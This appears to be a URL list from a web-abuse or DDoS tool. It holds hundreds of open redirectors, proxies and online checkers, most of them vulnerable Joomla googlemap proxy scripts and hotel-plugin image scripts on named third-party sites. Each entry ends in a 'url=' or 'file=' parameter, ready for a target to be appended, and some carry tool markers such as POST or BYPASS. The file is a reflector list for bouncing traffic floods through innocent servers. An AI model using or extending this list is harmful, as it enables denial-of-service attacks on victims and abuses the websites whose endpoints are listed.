     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://www.google.com/?q=',
     'http://regex.info/exif.cgi?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://www.google.com/?q=',
     'http://regex.info/exif.cgi?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://api.duckduckgo.com/html/?q=',
     'http://boorow.com/Pages/site_br_aspx?query=',
     'http://www.ask.com/web?q=',
     'http://search.lycos.com/web/?q=',
     'http://busca.uol.com.br/web/?q=',
     'http://us.yhs4.search.yahoo.com/yhs/search?p=',
     'http://www.heatwalkingcycling.org/index.php?pg=',
     'http://fresno.steinwaydealer.com/index.php?go=',
     'http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=',
     'http://www.karplaw.com/index.php?go=',
     'http://www.veithsymposium.org/index.php?pg=',
     'http://www.zikgu.info/search.php?go=',
     'http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=',
     'http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=',
     'http://www.opensecrets.org/open=',
     'http://www.budogu.jp/cart/syscheck.cgi?url=',
     'http://abcnews.go.com/?page=',
     'http://www.budogu.jp/cart/syscheck.cgi?url=',
     'http://www.opensecrets.org/open=',
     'http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=',
     'http://www.webmd.com/lung/tc/acute-bronchitis-topic-overview?page=',
     'http://www.benefitmall.com/?TabID=36&emailurl=',
     'http://www.tolerance.org/?source=redirect&url=teachingtolerance?url=',
     'http://www.accuride.co.jp/cgi/check.cgi?url=',
     'http://www.caafcgilsicilia.it/?id_pagina=',
     'http://www.professioni24.ilsole24ore.com/?page=',
     'http://italia.virgilio.it/?ckset=force&amp;cityRedirect=falseredirect=',
     'http://oknabm.ru/index.php?pg=',
     'http://www.thrombosis2016.org/index.php?go=',
     'http://www.gotm.net/index.php?go=',
     'http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=',
     'http://david.bach.profesores.ie.edu/?profesor=david.bach&pagina=',
     'http://javier.carrillo.profesores.ie.edu/?profesor=javier.carrillo&pagina=',
     'http://www.fabrizio.salvador.profesores.ie.edu/?profesor=fabrizio.salvador&pagina=',
     'http://manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=',
     'http://efernandez-cantelli.profesores.ie.edu/?profesor=efernandez-cantelli&pagina=',
     'http://www.manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=',
     'http://www.marvin.com/?page=',
     'http://www.ivrr.de/proxy.php?url=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=',
     'http://www.rssboard.org/rss-validator/check.cgi?url=',
     'http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=',
     'http://prodvigator.bg/redirect.php?url=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.ccm.edu/redirect/goto.asp?myURL=',
     'http://forum.buffed.de/redirect.php?url=',
     'http://rissa.kommune.no/engine/redirect.php?url=',
     'http://www.sadsong.net/redirect.php?url=',
     'https://www.fvsbank.com/redirect.php?url=',
     'http://www.jerrywho.de/?s=/redirect.php?url=',
     'http://www.inow.co.nz/redirect.php?url=',
     'http://www.automation-drive.com/redirect.php?url=',
     'http://mytinyfile.com/redirect.php?url=',
     'http://ruforum.mt5.com/redirect.php?url=',
     'http://www.websiteperformance.info/redirect.php?url=',
     'http://www.airberlin.com/site/redirect.php?url=',
     'http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=',
     'http://evoec.com/review/redirect.php?url=',
     'http://www.crystalxp.net/redirect.php?url=',
     'http://watchmovies.cba.pl/articles/includes/redirect.php?url=',
     'http://www.seowizard.ir/redirect.php?url=',
     'http://apke.ru/redirect.php?url=',
     'http://seodrum.com/redirect.php?url=',
     'http://redrool.com/redirect.php?url=',
     'http://blog.eduzones.com/redirect.php?url=',
     'http://www.onlineseoreportcard.com/redirect.php?url=',
     'http://www.wickedfire.com/redirect.php?url=',
     'http://searchtoday.info/redirect.php?url=',
     'http://www.bobsoccer.ru/redirect.php?url=',
     'http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=',
     'http://www.firmia.cz/redirect.php?url=',
     'http://palinstravels.co.uk/redirect.php?url=',
     'http://www.phuketbranches.com/admin/redirect.php?url=',
     'http://tools.strugacreative.com/redirect.php?url=',
     'http://www.elec-intro.com/redirect.php?url=',
     'http://maybeit.net/redirect.php?url=',
     'http://www.usgpru.net/redirect.php?url=',
     'http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=',
     'http://www.webaverage.com/redirect.php?url=',
     'http://www.seorehash.com/redirect.php?url=',
     'http://www.seo.khabarsaz.net/redirect.php?url=',
     'http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=',
     'http://www.informeseogratis.com/redirect.php?url=',
     'http://www.websites-canada.com/redirect.php?url=',
     'http://zakaztovarov.net/redirect.php?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.marumura.com/redirect.php?url=',
     'http://old.leginet.eu/redirect.php?url=',
     'http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=',
     'http://www.tuangou.do/proxy.php?url=',
     'http://www.gvpl.ca/url/proxy.php?url=',
     'http://weiter-lesen.net/web/proxy.php?url=',
     'http://soroka-vorovka.com/proxy/proxy.php?url=',
     'http://www.cogsci.ed.ac.uk/~richard/xml-check.cgi?url=',
     'http://pro.athealth.co.jp/cgi-bin/pro/check.cgi?url=',
     'http://ukrhome.net/go.php?url=',
     'http://www.aliancaandroid.com/go.php?url=',
     'http://www.hangglider.kiev.ua/go.php?url=',
     'http://it4pal.com/ar/go.php?url=',
     'http://paperplane.su/go.php?url=',
     'http://www.education.net.au/go.php?url=',
     'http://www.bloggerexp.com/go.php?url=',
     'http://www.lifetype.ru/go.php?url=',
     'http://blogerator.ru/go.php?url=',
     'http://www.hella.ru/go.php?url=',
     'http://fcmanutd.com/go.php?url=',
     'http://www.sitysoft.com/go.php?url=',
     'https://www.google.com/interstitial?url=',
     'http://www.flashreport.org/blog/go.php?url=',
     'http://www.otworld.de/go.php?url=',
     'http://www.ennk.ru/go.php?url=',
     'http://www.xoxohth.com/go.php?url=',
     'http://dochtm.com/go.php?url=',
     'http://www.autoadmit.com/go.php?url=',
     'http://www.vttour.fr/actu/go.php?url=',
     'http://www.geodream.ru/go.php?url=',
     'http://jp.trefoil.tv/go.php?url=',
     'http://irc.ifmo.ru/go.php?url=',
     'http://baanna.net/go.php?url=',
     'http://www.morningcoffee.co.kr/go.php?url=',
     'http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=',
     'http://irc.ifmo.ru/go.php?url=',
     'http://www.webchirkut.com/go.php?url=',
     'http://www.parkcity.org/redirect.aspx?url=',
     'http://hao.zw51.cn/go.php?url=',
     'http://dmoz.by/go.php?url=',
     'http://www.dandelionradio.com/go.php?url=',
     'http://www.go.php-fusion-iran.com/go.php?url=',
     'http://helpful-information.com/relationships/go.php?url=',
     'http://www.health.omskinform.ru/go.php?url=',
     'http://www.eitforum.com/go.php?url=',
     'http://ipove.info/go.php?url=',
     'http://www.treasure-vacations.com/go.php?url=',
     'http://www.deutsche-krieger.de/go.php?url=',
     'http://rusbody.com/go.php?url=',
     'http://www.bonsai-for-beginners.com/go.php?url=',
     'http://twitnow.ru/go.php?url=',
     'http://www.1300dental.com.au/go.php?url=',
     'http://engelcosmetology.kiev.ua/go.php?url=',
     'http://vps.cohenrisk.com/~xoxohth/go.php?url=',
     'http://valaholeuropaban.uw.hu/guestbook/go.php?url=',
     'http://enrique-iglesias.net/guestbook/go.php?url=',
     'http://www.morningcoffee.co.kr/go.php?url=',
     'http://www.find-a-car.info/go.php?url=',
     'http://snowcore.net/go.php?url=',
     'http://jp.trefoil.tv/go.php?url=',
     'http://www.1300franchises.com/go.php?url=',
     'http://www.information-guru.com/book-marketing/go.php?url=',
     'http://www.boxingscene.com/weight-loss/go.php?url=',
     'http://www.ninja-thailand.com/go.php?url=',
     'http://shack.ir/go.php?url=',
     'http://www.quelsoft.com/go.php?url=',
     'http://www.jonko.eu/tools/hide_referrer/go.php?url=',
     'http://lj.hangye5.com/go.php?url=',
     'http://www.lightningring.com/guestbook/go.php?url=',
     'http://www.1300directory.com.au/go.php?url=',
     'http://www.litinvest.com/catalog/go.php?url=',
     'http://www.1300clothing.com.au/go.php?url=',
     'http://verkehrshaus.org/go.php?url=',
     'http://www.xohth.com/beta/go.php?url=',
     'http://auctionsinfo.net76.net/go.php?url=',
     'http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=',
     'http://www.1300dentist.com.au/go.php?url=',
     'http://www.forodeprogramas.com/go.php?url=',
     'http://thatware.org/go.php?url=',
     'http://www.star.lu/go.php?url=',
     'http://www.dailytechinfo.org/go.php?url=',
     'http://m-bizportal.ru/go.php?url=',
     'http://geostats2004.com/go.php?url=',
     'http://shopdazzles.com/guestbook/go.php?url=',
     'http://www.geodream.ru/go.php?url=',
     'http://www.1800dental.com.au/go.php?url=',
     'http://www.flappen.nl/gb/go.php?url=',
     'http://webmasterplus.us/go/go.php?url=',
     'http://www.sportzone.ru/go.php?url=',
     'http://kuzen.ru/go.php?url=',
     'http://1300dating.com.au/go.php?url=',
     'http://kinoamator.ru/go.php?url=',
     'http://autoqa.org/go.php?url=',
     'http://1300agents.com.au/go.php?url=',
     'http://depressionclub.awardspace.com/go.php?url=',
     'http://www.1300lifestyle.com.au/go.php?url=',
     'http://www.onlinegratis.tv/go.php?url=',
     'http://7days.kiev.ua/go.php?url=',
     'http://www.jenteporten.no/go.php?url=',
     'http://www.recipes.portalnews.de/go.php?url=',
     'http://www.infogine.com/articles/aerobics-cardio/go.php?url=',
     'http://13auto.com.au/go.php?url=',
     'http://www.socialgrid.com/go.php?url=',
     'http://www.spaleon.de/go.php?url=',
     'http://waptrochoi.net/go.php?url=',
     'http://www.ai.rug.nl/~doesburg/gbook/go.php?url=',
     'http://www.keralaclick.com/photography/go.php?url=',
     'http://kormoranfolk.hu/guestbook/go.php?url=',
     'http://sidlogic.com/content/recipes/go.php?url=',
     'http://www.languageisavirus.com/articles/writing/language/go.php?url=',
     'http://2013toyotacorolla.com/go.php?url=',
     'http://customerserviceauthority.com/go.php?url=',
     'http://www.beautytipsadvice.infoslobber.com/go.php?url=',
     'http://www.tripdirect.com/go.php?url=',
     'http://spiritual-link.com/go.php?url=',
     'http://learningresource.info/hair-loss-and-thinning/go.php?url=',
     'http://www.backpacker.no/go.php?url=',
     'http://aff.apk4fun.com/go.php?url=',
     'http://www.totalwars.ru/go.php?url=',
     'http://www.fediea.org/go.php?url=',
     'http://articles.pointshop.com/college/go.php?url=',
     'http://mcpe.tw/go.php?url=',
     'http://www.qosmo.com/go.php?url=',
     'http://www.alopa.com/go.php?url=',
     'http://coreychang.net/gbook/go.php?url=',
     'http://www.1001topwords.com/marketing1/marketing/go.php?url=',
     'http://www.bait-tackle.com/go.php?url=',
     'http://monkeezemarketing.com/go.php?url=',
     'http://www.lincolnhsbrooklyn.com/go.php?url=',
     'http://healthwebsitebusinesses.com/demo/diabetes/go.php?url=',
     'http://ww3.myonlinestats.com/go/go.php?url=',
     'http://www.wmhs.com/newmobile/redirect.php?page=',
     'http://www.szene-drinks.com/redirect.php?page=',
     'http://www.swzundert.nl/redirect.php?page=',
     'http://www.denbreems.nl/redirect.php?page=',
     'http://www.flohmarkt.ch/redirect.php?page=',
     'http://www.erhvervscentrum.dk/redirect.php?page=',
     'http://www.netintellgames.com/redirect.php?page=',
     'http://www.pia.org/IRC/qs/redirect.php?page=',
     'http://www.pcpros-tx.com/php/redirect.php?page=',
     'http://www.allencapital.com/redirect.php?page=',
     'http://www.taosadultbasketballleague.com/redirect.php?page=',
     'http://taosadultbasketball.com/redirect.php?page=',
     'http://www.graphisoftus.com/redirect.php?page=',
     'http://purificato.org/rawlab/redirect.php?page=',
     'http://www.anglobelge.com/EN/splash-page/redirect.php?page=',
     'http://tzf.free.fr/redirect.php?page=',
     'http://www.tandem-club.org.uk/files/public_html/redirect.php?page=',
     'http://rawlab.mindcreations.com/redirect.php?page=',
     'http://www.hxtrack.com/redirect.php?page=',
     'http://signaturesx.com/redirect.php?page=',
     'http://www.fsds.sanmarinoscacchi.sm/gotoURL.asp?url=',
     'http://www.niemannpick.org/gotoURL.asp?url=',
     'http://trasparenza.atpsassari.it/gotoURL.asp?url=',
     'http://www.vespaclubportogruaro.it/gotoURL.asp?url=',
     'http://www.pillole.org/public/aspnuke/gotoURL.asp?url=',
     'http://trasparenza.atpsassari.it/gotoURL.asp?url=',
     'http://www.vespaclubportogruaro.it/gotoURL.asp?url=',
     'http://www.quiere-t.net/gotoURL.asp?url=',
     'http://www.pocoserio.com/gotoURL.asp?url=',
     'http://win.aiafa.it/gotoURL.asp?url=',
     'http://www.centromorin.it/aspnuke207/gotoURL.asp?url=',
     'http://www.asim.it/public/gotoURL.asp?url=',
     'http://www.straz.bialapodlaska.pl/km/gotoURL.asp?url=',
     'http://www.beatote.com/gotoURL.asp?url=',
     'http://www.monteargentario.it/gotoURL.asp?url=',
     'http://www.trasporti.marche.it/nuke/gotoURL.asp?url=',
     'http://www.elparadise.com/gotoURL.asp?url=',
     'http://www.chiauci-webforum.it/gotoURL.asp?url=',
     'http://www.icfpet.it/gotoURL.asp?url=',
     'http://www.dgtale.it/gotoURL.asp?url=',
     'http://www.aspnuke.it/gotoURL.asp?url=',
     'http://www.aicritalia.org/gotoURL.asp?url=',
     'http://www.viggiu-in-rete.org/newsite/gotoURL.asp?url=',
     'http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=',
     'http://www.dffyw.com/dir/gotourl.asp?url=',
     'http://www.mentalism.it/gotoURL.asp?url=',
     'http://www.ematube.it/gotoURL.asp?url=',
     'http://www.golfclubambrosiano.it/gotoURL.asp?url=',
     'http://resuite.upg.it/gotoURL.asp?url=',
     'http://www.cgqd.com/shop/it/gotourl.asp?url=',
     'http://www.unicyclist.it/gotoURL.asp?url=',
     'http://www.the-cure.eu/gotoURL.asp?url=',
     'http://www.deminformatica.com/gotoURL.asp?url=',
     'http://www.scienzaevita.info/public/site/gotoURL.asp?url=',
     'http://www.the-cure.eu/gotoURL.asp?url=',
     'http://www.deminformatica.com/gotoURL.asp?url=',
     'http://www.scienzaevita.info/public/site/gotoURL.asp?url=',
     'http://www.idealdieta.it/gotoURL.asp?url=',
     'https://www.google.pl/interstitial?url=',
     'http://www.ematube.it/gotoURL.asp?url=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
     'http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=',
     'http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
